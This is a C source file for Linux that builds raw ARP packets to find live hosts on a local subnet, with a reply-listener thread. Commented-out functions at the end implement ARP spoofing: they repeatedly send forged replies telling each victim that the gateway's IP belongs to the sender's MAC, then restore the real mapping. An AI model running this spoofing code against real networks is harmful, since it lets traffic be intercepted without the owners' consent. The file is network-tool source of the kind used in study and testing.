#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <signal.h>
#include <sys/wait.h>
#include <pthread.h>

#define BUF_SIZE 128
#define HOST_NR 65536

static int snd_sock = -1;
static int rcv_sock = -1;

static int ifindex;
static unsigned int snd_ip;
static unsigned int subnet;
static unsigned char snd_mac[6];
static unsigned char * alive_table[HOST_NR];

typedef void (*user_func)(unsigned int, unsigned char *);

static void dealloc_table(void)
{
	int cnt;
	for (cnt = 0; cnt < HOST_NR; cnt++)
	{
		if (alive_table[cnt])
			free(alive_table[cnt]);
		alive_table[cnt] = NULL;
	}
}

int arp_init(int idx, int ip, int netmask, unsigned char * mac)
{
	if (snd_sock != -1 || rcv_sock != -1)
		return -512;

	snd_sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (snd_sock < 0)
		return -errno;	

	rcv_sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (rcv_sock < 0)
	{
		int ret = -errno;
		close(snd_sock);
		return ret;
	}	

	ifindex = idx;
	snd_ip = ip;
	subnet = netmask;
	memcpy(snd_mac, mac, 6);

	return 0;
}

int arp_exit(void)
{
	if (snd_sock < 0 && rcv_sock < 0)
		return -512;	

	close(snd_sock);
	close(rcv_sock);

	snd_sock = -1;
	rcv_sock = -1;

	dealloc_table();	

	return 0;
}

unsigned char * create_arp_packet(unsigned char * buf, unsigned short op, 
				unsigned char * host, unsigned int src,
				unsigned char * target, unsigned int dest)
{
	unsigned char * ptr;
	struct ethhdr * eth;
	struct arphdr * arp;

	eth = (struct ethhdr *)buf;
	//set ethernet header
	memcpy(eth->h_source, host, 6); //MAC address length
	if (!target)
		memset(eth->h_dest, 0xff, 6); //broadcast
	else
		memcpy(eth->h_dest, target, 6);
	eth->h_proto = htons(ETH_P_ARP);

	arp = (struct arphdr *)(eth + 1);
	//set arp header
	arp->ar_hrd = htons(1); //Ethernet
	arp->ar_pro = htons(ETH_P_IP); //IPv4
	arp->ar_hln = 6; //hw address length
	arp->ar_pln = 4; //ip address length
	arp->ar_op = htons(op); //Operation

	ptr = (unsigned char *)(arp + 1);
	//payload
	memcpy(ptr, host, 6); //sha
	ptr += 6;
	memcpy(ptr, &src, 4); //spa
	ptr += 4;
	if (!target) //tha
		memset(ptr, 0, 6); //who is target?
	else
		memcpy(ptr, target, 6);
	ptr += 6;
	memcpy(ptr, &dest, 4); //tpa

	return buf;
}

//receiver routine
void * reply_handle(void * arg)
{
	unsigned char buf[BUF_SIZE], * ptr;
	struct arphdr * arp;

	user_func uf = (user_func)arg;

	while (1)
	{
		int len = recvfrom(rcv_sock, buf, BUF_SIZE, 0, NULL, NULL);
		unsigned int nr;

		if (len < 0)
			break;

		ptr = buf;
		ptr += sizeof(struct ethhdr); //go to arp header
		arp = (struct arphdr *)ptr;
	
		if (ntohs(arp->ar_op) != ARPOP_REPLY)
			continue;

		ptr += sizeof(struct arphdr); //go to arp payload
		ptr += 6; //spa

		nr = (*(unsigned int *)ptr);
		nr = ntohl(nr & ~subnet); //host address
		if (alive_table[nr]) //Already exist
			continue;

		alive_table[nr] = (unsigned char *)malloc(6);

		if (uf)
			uf(*(unsigned int *)ptr, ptr - 6);
		else
			printf("%d\n", nr);

		//get_vendor(vendor, ptr - 6);
		//printf("%s\t[%s]\t[%s]\n", 
				//inet_ntoa(*(struct in_addr *)ptr), //IP address
				//ether_ntoa_e((ptr - 6)), vendor); //MAC address

		memcpy(alive_table[nr], ptr - 6, 6);	
	}	

	return NULL;
}

int scanning(int start, int end, void (func)(unsigned int, unsigned char *))
{
	unsigned int host = start;
	unsigned int network_addr = snd_ip & subnet;

	unsigned char buf[BUF_SIZE];
	struct sockaddr_ll device;

	int delay = 1000;
	int pkt_size = sizeof(struct ethhdr) + sizeof(struct arphdr) + 20;

	pthread_t tid;

	dealloc_table();

	memset(&device, 0, sizeof(device));
	device.sll_ifindex = ifindex;
	device.sll_halen = ETH_ALEN;
	memset(device.sll_addr, 0xff, 6); //broadcast
	
	pthread_create(&tid, NULL, reply_handle, func);

	while (host <= end)
	{
		unsigned int target = network_addr | htonl(host++); //target ip

		create_arp_packet(buf, ARPOP_REQUEST, snd_mac, snd_ip, NULL, target);
		if (sendto(snd_sock, buf, pkt_size, 0, (struct sockaddr *)&device, sizeof(device)) < 0)
			return -errno;

		usleep(delay); //1ms
	}
	sleep(5); //wait for other reply packets,

	pthread_cancel(tid);
	pthread_join(tid, NULL);

	return 0;
}


void aaa(unsigned int ip, unsigned char * mac)
{
	printf("called\n");
}

/*int main()
{
	unsigned char zz[] = {0x7c, 0x7a, 0x91, 0x35, 0x80, 0x95};
	if (arp_init(3, inet_addr("192.168.25.95"), inet_addr("255.255.255.0"), zz) < 0)
	{	
		printf("ZZ\n");
		return -1;
	}

	scanning(0, 255, aaa);

	arp_exit();

	return 0;
}*/

/*void * spoof_unit(void * arg)
{	
	unsigned char buf[BUF_SIZE]; //Not be shared!
	struct sockaddr_ll device;

	int * args = (int *)arg;
	int if_index = args[0], t = args[1], arp_sock = args[2];
	int pkt_size = sizeof(struct ethhdr) + sizeof(struct arphdr) + 20;
	int cnt;

	memset(&device, 0, sizeof(device));
	device.sll_ifindex = if_index;
	device.sll_halen = ETH_ALEN;
	memcpy(device.sll_addr, host_list[t]->mac, 6);

	printf("Host: %d Spoofing START\n", t);

	//create_arp_packet()이 loop밖에서 한번 초기화 시키고  재사용하면 잘 안되는 듯.
	while (spoof_continue)
	{
		create_arp_packet(buf, ARPOP_REPLY, this.mac, gateway.ip, host_list[t]->mac, host_list[t]->ip);
		sendto(arp_sock, buf, pkt_size, 0, (struct sockaddr *)&device, sizeof(device));
		sleep(3);
	}

	//restore packet	
	for (cnt = 0; cnt < 2; cnt++)
	{
		create_arp_packet(buf, ARPOP_REPLY, gateway.mac, gateway.ip, host_list[t]->mac, host_list[t]->ip);
		sendto(arp_sock, buf, pkt_size, 0, (struct sockaddr *)&device, sizeof(device));
		usleep(100);
	}

	free(args);
	return NULL;
}*/

/*void spoofing(int idx) //default is for all hosts
{
	int t;
	unsigned char buf[BUF_SIZE];
	unsigned int max = ntohl(~this.subnet);
	int arp_sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	int * args;
	pthread_t * tids, tid;

	no_print = 1; //no output about scannnig
	scanning(idx);

	if (max > 8192)
		max = 8192;

	signal(SIGINT, sighandle);
	tids = malloc(sizeof(pthread_t) * max);
	memset(tids, 0, sizeof(pthread_t) * max);

	printf("\n\n\tARP Spoofing Start\n\n");

	for (t = 1; t <= max; t++)
	{		
		if (!host_list[t]) //No host,
			continue;
		if (host_list[t]->ip == gateway.ip)
			continue;

		if (victim && host_list[t]->ip != victim)
			continue;

		args = (int *)malloc(sizeof(int) * 3);
		args[0] = idx; args[1] = t; args[2] = arp_sock;

		if (!pthread_create(&tid, NULL, spoof_unit, args))
			tids[t] = tid;
		else
		{
			perror("pthread_create() error");
			free(args);
		}
	}
	printf("\tPress CTRL-C for termination\n");

	while (spoof_continue)
		sleep(1);
	printf ("\tTake a Moment Plz\n");

	for (t = 1; t < max; t++)
	{
		if (!tids[t])
			continue;
		pthread_join(tids[t], NULL);
	}

	printf("\tARP Spoofing Stop\n");

	free(tids);
	close(arp_sock);
}*/
